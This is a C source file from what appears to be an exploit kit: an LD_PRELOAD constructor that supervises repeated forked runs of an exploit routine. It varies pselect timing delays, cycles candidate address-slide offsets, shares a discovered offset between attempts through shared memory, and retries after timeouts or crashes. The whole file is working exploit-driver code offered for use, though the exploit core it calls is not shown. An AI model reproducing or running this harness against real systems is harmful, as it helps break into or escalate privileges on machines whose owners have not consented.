#include "common.h"

#define DEFAULT_EXPLOIT_ATTEMPTS 16
#define DEFAULT_PSELECT_DELAY_USEC 20000
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
static const uintptr_t app_slide_p0_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};

struct app_p0_shared_state {
  atomic_int ready;
  _Atomic uintptr_t offset;
};

static struct app_p0_shared_state *app_p0_state;

void app_publish_p0_offset(uintptr_t offset) {
  if (!app_p0_state) {
    return;
  }
  atomic_store(&app_p0_state->offset, offset);
  atomic_store(&app_p0_state->ready, 1);
}

#endif

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
  return delay < 0 ? 0 : delay;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
  if (!getenv("EXPLOIT_ATTEMPTS") && !getenv("SLIDE_P0_OFFSET")) {
    max_attempts =
        (int)(sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]));
  }
#endif
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  int attempt_timeout_sec = env_int(
      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
  int p0_attempt_timeout_sec = env_int(
      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
      attempt_timeout_sec);
  if (p0_attempt_timeout_sec > attempt_timeout_sec) {
    p0_attempt_timeout_sec = attempt_timeout_sec;
  }
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
  app_p0_state = mmap(NULL, sizeof(*app_p0_state), PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (app_p0_state == MAP_FAILED) {
    pr_error("app p0 shared state mmap failed errno=%d\n", errno);
    _exit(1);
  }
#endif

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d "
             "p0_timeout=%d timeout=%d\n",
             getpid(), max_attempts, base_delay, p0_attempt_timeout_sec,
             attempt_timeout_sec);

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
    uintptr_t app_attempt_offset = 0;
    if (!getenv("SLIDE_P0_OFFSET")) {
      size_t candidate_index =
          (size_t)(attempt - 1) %
          (sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]));
      app_attempt_offset = app_slide_p0_offsets[candidate_index];
    }
#endif
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
      if (!getenv("SLIDE_P0_OFFSET")) {
        char offset_arg[16];
        snprintf(offset_arg, sizeof(offset_arg), "0x%zx", app_attempt_offset);
        SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
      }
      pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
                 attempt, max_attempts, getpid(), delay_usec,
                 getenv("SLIDE_P0_OFFSET"));
#else
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
#endif
      _exit(run_exploit(1, argv));
    }

    int status = 0;
    pid_t waited = 0;
    struct timespec started;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
    for (;;) {
      waited = waitpid(child, &status, WNOHANG);
      if (waited == child) {
        break;
      }
      if (waited < 0 && errno != EINTR) {
        break;
      }

      struct timespec now;
      SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
      time_t elapsed = now.tv_sec - started.tv_sec;
      int timeout_sec = attempt_timeout_sec;
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
      if (!getenv("SLIDE_P0_OFFSET") &&
          !atomic_load(&app_p0_state->ready)) {
        timeout_sec = p0_attempt_timeout_sec;
      }
#endif
      if (elapsed >= timeout_sec) {
        pr_warning("exploit attempt=%d/%d timeout pid=%d seconds=%d\n",
                   attempt, max_attempts, child, timeout_sec);
        SYSCHK(kill(child, SIGKILL));
        do {
          waited = waitpid(child, &status, 0);
        } while (waited < 0 && errno == EINTR);
        break;
      }
      usleep(100000);
    }
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      return;
    }

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
    if (!getenv("SLIDE_P0_OFFSET") &&
        atomic_load(&app_p0_state->ready)) {
      uintptr_t offset = atomic_load(&app_p0_state->offset);
      char offset_arg[16];
      snprintf(offset_arg, sizeof(offset_arg), "0x%zx", offset);
      SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
      pr_success("supervisor retained discovered p0_offset=%s\n", offset_arg);
    }
#endif

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                 WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
  _exit(1);
}
